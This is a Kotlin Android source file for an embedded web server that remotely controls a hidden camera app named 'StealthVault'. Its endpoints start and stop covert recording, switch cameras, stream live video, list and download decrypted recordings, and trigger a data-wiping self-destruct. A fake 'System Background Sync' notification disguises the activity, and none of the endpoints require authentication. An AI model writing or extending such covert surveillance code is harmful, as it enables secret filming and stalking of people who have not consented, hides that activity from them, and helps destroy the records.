package com.stealth.evidence.ui

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import io.ktor.http.ContentType
import io.ktor.http.HttpStatusCode
import io.ktor.server.application.call
import io.ktor.server.engine.embeddedServer
import io.ktor.server.netty.Netty
import io.ktor.server.netty.NettyApplicationEngine
import io.ktor.server.response.header
import io.ktor.server.response.respondOutputStream
import io.ktor.server.response.respondText
import io.ktor.server.routing.get
import io.ktor.server.routing.routing
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.system.exitProcess

class EmbeddedServer(private val appContext: Context) {
    private var server: NettyApplicationEngine? = null

    fun start() {
        CoroutineScope(Dispatchers.IO).launch {
            server = embeddedServer(Netty, port = 8080) {
                routing {
                    get("/") {
                        call.respondText("StealthVault Server is running in STANDBY")
                    }
                    
                    // --- カメラ・録画操作 ---
                    get("/start") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_START_RECORDING
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Recording to Vault started")
                    }
                    
                    get("/stop") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_STOP_RECORDING
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Recording to Vault stopped")
                    }

                    get("/switch") {
                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            action = StealthCameraService.ACTION_SWITCH_CAMERA
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Camera switched")
                    }

                    get("/notify") {
                        sendCamouflageNotification()
                        call.respondText("Camouflage notification sent")
                    }

                    // --- 動画データ（Vault）操作 ---
                    // 遠隔：動画ファイル一覧の取得（JSON形式で返す）
                    get("/videos") {
                        val vaultManager = VaultManager(appContext)
                        val files = vaultManager.getVaultFiles()
                        
                        val jsonList = files.joinToString(prefix = "[", postfix = "]") { file ->
                            val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(file.lastModified()))
                            // クライアントでパースしやすいように単純なJSON文字列を作る
                            "{\"name\":\"${file.name}\", \"size\":${file.length()}, \"date\":\"$dateStr\"}"
                        }
                        call.respondText(jsonList, ContentType.Application.Json)
                    }

                    // 遠隔：動画ファイルのダウンロード（復号してMP4としてストリーム送信）
                    get("/download") {
                        val fileName = call.request.queryParameters["name"]
                        if (fileName == null) {
                            call.respondText("Missing file name", status = HttpStatusCode.BadRequest)
                            return@get
                        }

                        val vaultManager = VaultManager(appContext)
                        val targetDat = vaultManager.getVaultFiles().find { it.name == fileName }
                        
                        if (targetDat == null) {
                            call.respondText("File not found", status = HttpStatusCode.NotFound)
                            return@get
                        }
                        
                        val decryptedTemp = vaultManager.decryptVideoFile(targetDat)
                        if (decryptedTemp == null) {
                            call.respondText("Decryption failed", status = HttpStatusCode.InternalServerError)
                            return@get
                        }

                        val downloadFileName = fileName.replace(".dat", ".mp4")
                        call.response.header("Content-Disposition", "attachment; filename=\"$downloadFileName\"")
                        
                        // 復号されたファイルを送信し、送信が終わったら確実に削除する
                        call.respondOutputStream(ContentType.parse("video/mp4")) {
                            try {
                                decryptedTemp.inputStream().use { it.copyTo(this) }
                            } finally {
                                if (decryptedTemp.exists()) {
                                    decryptedTemp.delete()
                                }
                            }
                        }
                    }

                    // 遠隔：自爆機能（データゼロ埋め消去 ＋ アプリ強制終了）
                    get("/kill") {
                        call.respondText("Executing Kill Switch... Wiping all Vault data.")
                        val vaultManager = VaultManager(appContext)
                        vaultManager.executeSelfDestruct() // ゼロ埋め上書き＆削除を実行
                        
                        Thread.sleep(1000) // クライアントに返答を返す猶予
                        exitProcess(0)
                    }

                    // --- 映像ストリーミング（MJPEG配信） ---
                    get("/stream") {
                        call.response.header("Cache-Control", "no-cache")
                        call.respondOutputStream(ContentType.parse("multipart/x-mixed-replace; boundary=--myboundary")) {
                            try {
                                while (true) {
                                    val jpeg = StealthCameraService.latestJpeg
                                    if (jpeg != null) {
                                        write("--myboundary\r\n".toByteArray())
                                        write("Content-Type: image/jpeg\r\n".toByteArray())
                                        write("Content-Length: ${jpeg.size}\r\n\r\n".toByteArray())
                                        write(jpeg)
                                        write("\r\n".toByteArray())
                                        flush()
                                    }
                                    Thread.sleep(100) // 約10fps
                                }
                            } catch (e: Exception) {
                                // 接続切断時はループを抜ける
                            }
                        }
                    }
                }
            }
            server?.start(wait = true)
        }
    }

    private fun sendCamouflageNotification() {
        val channelId = "camouflage_channel"
        val notificationManager = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Background Sync",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(appContext, channelId)
            .setContentTitle("システム同期")
            .setContentText("同期を開始しました (バックグラウンド処理中)")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(999, notification)
    }

    fun stop() {
        server?.stop(1000, 2000)
    }
}
